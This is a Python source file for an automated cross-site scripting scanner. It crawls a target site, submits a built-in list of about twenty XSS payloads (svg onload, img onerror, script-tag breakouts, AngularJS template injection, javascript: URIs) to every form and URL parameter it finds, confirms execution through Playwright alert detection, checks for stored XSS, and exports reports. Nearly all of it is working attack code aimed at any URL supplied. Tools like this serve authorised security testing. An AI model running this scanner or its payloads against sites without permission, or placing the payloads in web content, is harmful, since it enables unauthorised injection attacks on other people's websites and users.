import argparse
import json
import csv
import threading
import html
import time
import uuid
import requests
import urllib3
import random
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
import xml.etree.ElementTree as ET
from playwright.sync_api import sync_playwright
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class XSScanner:
    def __init__(self, target_url=None, proxy_url=None, threads=4, depth=2, report_format=None, callback=None):
        self.target_url = target_url
        self.proxy_url = proxy_url
        self.max_workers = threads
        self.scan_depth = depth
        self.report_format = report_format
        self.callback = callback
        self.session = requests.Session()
        self.reset_state()  # Initialize state variables
        self.lock = threading.Lock()
        self.stop_scan = False

        if self.proxy_url and not self.proxy_url.startswith(('http://', 'https://')):
            self.proxy_url = 'http://' + self.proxy_url
        if self.proxy_url:
            self.session.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
            self.session.verify = False

        self.timeout = 10
        self.rate_limit = 0.0  # minimal delay for speed
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Linux; Android 10)'
        ]

    def reset_state(self):
        """Reset scanner state between scans"""
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.valid_contexts = []
        self._seen_structures = set()
        self._field_types = {}

    def get_reflected_templates(self):
        return [
            '"><svg><animatetransform onbegin=alert(133333333337)>',
            "5&'},x=x=>{throw/**/onerror=alert,133333333337},toString=x,window+'',{x:'",
            'http://foo?&apos;-alert(133333333337)-&apos;',
            '{{$on.constructor(\'alert(133333333337)\')()}}',
            '<><img src=1 onerror=alert(133333333337)>',
            '</script><script>alert(133333333337)</script>',
            '"onmouseover="alert(133333333337)',
            "'-alert(133333333337)-'",
            '<svg><a><animate+attributeName=href+values=javascript:alert(133333333337) /><text+x=20+y=20>Click me</text></a>',
            '\\"-alert(133333333337)}}//',
            "\\'-alert(133333333337)//",
            '\\\'-alert(133333333337)//',
            '\\"-alert(133333333337)}//',
            '"><svg onload=alert(133333333337)>',
            '<img src=1 onerror=alert(133333333337)>',
            '" onmouseover=\"alert(133333333337)\"',
            '?accesskey= x onclick= alert(1)',
            '<script>alert(133333333337)</script>',
            'javascript:alert(133333333337)',
            '<svg onload=alert(133333333337)>'
        ]

    def crawl(self, url, depth=0):
        if depth > self.scan_depth or url in self.crawled_urls or self.stop_scan:
            return
        self.crawled_urls.add(url)
        try:
            if self.callback:
                self.callback({'type': 'info', 'message': f"Crawling: {url}"})
            headers = {'User-Agent': random.choice(self.user_agents)}
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            soup = BeautifulSoup(resp.content, 'html.parser')

            for form in soup.find_all('form'):
                entry = self.validate_form(form, url)
                if entry:
                    self.log_valid(entry)
                    if self.callback:
                        self.callback({'type': 'info', 'message': f"Found form at: {entry['context']}"})

            links = [urljoin(url, a['href']) for a in soup.find_all('a', href=True)]
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                for link in links:
                    if urlparse(link).netloc == urlparse(self.target_url).netloc:
                        executor.submit(self.crawl, link, depth+1)

            if '?' in url:
                entry = self.validate_url_params(url)
                if entry:
                    self.log_valid(entry)
                    if self.callback:
                        self.callback({'type': 'info', 'message': f"Found URL parameters at: {entry['context']}"})

        except Exception as e:
            if self.callback:
                self.callback({'type': 'error', 'message': f"Crawl error on {url}: {str(e)}"})

    def validate_form(self, form, page_url):
        action = urljoin(page_url, form.get('action', page_url))
        method = form.get('method', 'get').upper()
        data, types = {}, {}
        for inp in form.find_all(['input', 'textarea']):
            name = inp.get('name')
            if not name:
                continue
            typ = inp.get('type', 'text').lower()
            pattern = (inp.get('pattern') or '').lower()
            types[name] = {'type': typ, 'pattern': pattern}

            if typ == 'hidden':
                val = inp.get('value', '')
            elif typ == 'email':
                val = 'test@emil.com'
            elif 'url' in typ or 'http:' in pattern or 'https:' in pattern:
                val = 'http://test'
            else:
                val = 'test'
            data[name] = val

        try:
            time.sleep(self.rate_limit)
            if method == 'POST':
                r = self.session.post(action, data=data, timeout=self.timeout)
            else:
                r = self.session.get(action, params=data, timeout=self.timeout)
            if 200 <= r.status_code < 400:
                return {'context': f"{action} ({method})", 'origin': page_url,
                        'status_code': r.status_code, 'fields': data, 'types': types}
        except:
            pass
        return None

    def validate_url_params(self, url):
        base = url.split('?', 1)[0]
        qs = parse_qs(urlparse(url).query)
        data = {k: 'test' for k in qs}
        types = {k: {'type': 'param', 'pattern': ''} for k in qs}
        query = '&'.join(f"{k}=test" for k in qs)
        try:
            time.sleep(self.rate_limit)
            r = self.session.get(f"{base}?{query}", timeout=self.timeout)
            if 200 <= r.status_code < 400:
                return {'context': f"{base} (GET)", 'origin': url, 'fields': data, 'types': types}
        except Exception:
            pass
        return None

    def log_valid(self, entry):
        key = tuple(sorted(entry['fields'].keys()))
        with self.lock:
            if key not in self._seen_structures:
                self._seen_structures.add(key)
                self._field_types[entry['context']] = entry.pop('types')
                self.valid_contexts.append(entry)

    def detect_stored(self, response, payload, origin_url):
        try:
            stored_resp = self.session.get(origin_url, timeout=self.timeout)
            st_text = stored_resp.text or ""
            st_soup = BeautifulSoup(st_text, 'html.parser')
            if payload in st_text:
                self.report_vulnerability('Stored', payload, origin_url)
                return True
            for tag in st_soup.find_all():
                for attr in ['onload', 'onerror', 'onmouseover', 'onclick']:
                    if payload in tag.attrs.get(attr, ''):
                        self.report_vulnerability(f'Stored Attribute XSS ({attr})', payload, origin_url)
                        return True
        except:
            pass
        return False

    def detect_runtime_playwright(self, url, token, timeout=3000):
        """
        Uses Playwright to detect alert dialogs containing the token.
        """
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            found = False

            def handle_dialog(dialog):
                nonlocal found
                try:
                    if str(token) in dialog.message:
                        found = True
                    dialog.dismiss()
                except Exception:
                    pass

            page.on('dialog', handle_dialog)
            try:
                # Navigate and wait until load
                page.goto(url, timeout=timeout)
                # Give time for any dialogs to fire
                page.wait_for_timeout(1000)
            except Exception:
                pass
            finally:
                browser.close()
            return found

    def run_payload_tests(self, workers=None):
        if workers is None:
            workers = self.max_workers
        def worker(entry):
            if self.stop_scan:
                return
            types = self._field_types.get(entry['context'], {})
            origin = entry['origin']
            action, method_paren = entry['context'].rsplit(' ', 1)
            method = method_paren.strip('()')
            token = '133333333337'
            for payload in self.get_reflected_templates():
                if self.stop_scan:
                    break
                data = {}
                for name, orig in entry['fields'].items():
                    field_info = types.get(name, {})
                    ftype = field_info.get('type', '')
                    pattern = (field_info.get('pattern', '') or '').lower()
                    if ftype == 'hidden':
                        data[name] = orig
                    elif ftype == 'email':
                        data[name] = 'test@emil.com'
                    elif 'url' in ftype or 'http:' in pattern or 'https:' in pattern:
                        data[name] = f"http://{payload}"
                    else:
                        data[name] = payload
                time.sleep(self.rate_limit)
                try:
                    if method == 'POST':
                        resp = self.session.post(action, data=data, timeout=self.timeout, allow_redirects=False)
                    else:
                        resp = self.session.get(action, params=data, timeout=self.timeout, allow_redirects=False)
                    url = resp.url
                    if self.detect_runtime_playwright(url, token):
                        qs = parse_qs(urlparse(url).query)
                        param = ''
                        for k, vals in qs.items():
                            if any(payload in v for v in vals):
                                param = k
                                break
                        self.report_vulnerability('Reflected (playwright)', payload, url, param)
                    self.detect_stored(resp, payload, origin)
                except Exception as e:
                    print(f"[-] Test error on {action}: {e}")
        with ThreadPoolExecutor(max_workers=workers) as executor:
            executor.map(worker, self.valid_contexts)

    def report_vulnerability(self, vuln_type, payload, source, param=None):
        timestamp = datetime.now().isoformat()
        entry = {
            'type': vuln_type,
            'parameter': param or '',
            'payload': payload,
            'source': source,
            'timestamp': timestamp
        }
        with self.lock:
            self.vulnerabilities.append(entry)
            if self.callback:
                self.callback(entry)

    def export_json(self, filename='report.json'):
        with open(filename, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)

    def export_csv(self, filename='report.csv'):
        keys = ['type', 'parameter', 'payload', 'source', 'timestamp']
        with open(filename, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            writer.writerows(self.vulnerabilities)

    def export_xml(self, filename='report.xml'):
        root = ET.Element('vulnerabilities')
        for vuln in self.vulnerabilities:
            el = ET.SubElement(root, 'vulnerability')
            for k, v in vuln.items():
                child = ET.SubElement(el, k)
                child.text = str(v)
        ET.ElementTree(root).write(filename, encoding='utf-8', xml_declaration=True)

    def start_scan(self):
        if not self.target_url:
            raise ValueError("Target URL is required")

        # Reset state before starting new scan
        self.reset_state()

        if self.callback:
            self.callback({'type': 'info', 'message': f"Starting scan on: {self.target_url}"})
            self.callback({'type': 'info', 'message': f"Threads: {self.max_workers}"})
            self.callback({'type': 'info', 'message': f"Proxy: {self.proxy_url or 'None'}"})
            self.callback({'type': 'info', 'message': f"Depth: {self.scan_depth}"})
            self.callback({'type': 'info', 'message': f"Crawling {self.target_url}..."})
        
        self.crawl(self.target_url)
        
        if self.callback:
            self.callback({'type': 'info', 'message': f"Contexts collected: {len(self.valid_contexts)}"})
            self.callback({'type': 'info', 'message': "Running XSS tests..."})
        
        self.run_payload_tests(self.max_workers)

        total = len(self.vulnerabilities)
        if self.callback:
            self.callback({'type': 'info', 'message': f"Scan complete. Found {total} vulnerabilities."})
        
        if self.report_format:
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'xss_report_{ts}'
            if self.report_format in ('json', 'all'):
                self.export_json(f'{filename}.json')
                if self.callback:
                    self.callback({'type': 'info', 'message': f"Exported JSON report: {filename}.json"})
            if self.report_format in ('csv', 'all'):
                self.export_csv(f'{filename}.csv')
                if self.callback:
                    self.callback({'type': 'info', 'message': f"Exported CSV report: {filename}.csv"})
            if self.report_format in ('xml', 'all'):
                self.export_xml(f'{filename}.xml')
                if self.callback:
                    self.callback({'type': 'info', 'message': f"Exported XML report: {filename}.xml"})

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner with Reporting')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Single target URL')
    group.add_argument('-l', '--list', help='File with URLs to scan')
    parser.add_argument('-p', '--proxy', default=None, help='Proxy URL')
    parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth')
    parser.add_argument('-r', '--report', choices=['json', 'csv', 'xml', 'all'], help='Report format')
    args = parser.parse_args()
    urls = [args.url] if args.url else open(args.list).read().split()
    for u in urls:
        scanner = XSScanner(u, args.proxy, args.threads, args.depth, args.report)
        scanner.start_scan()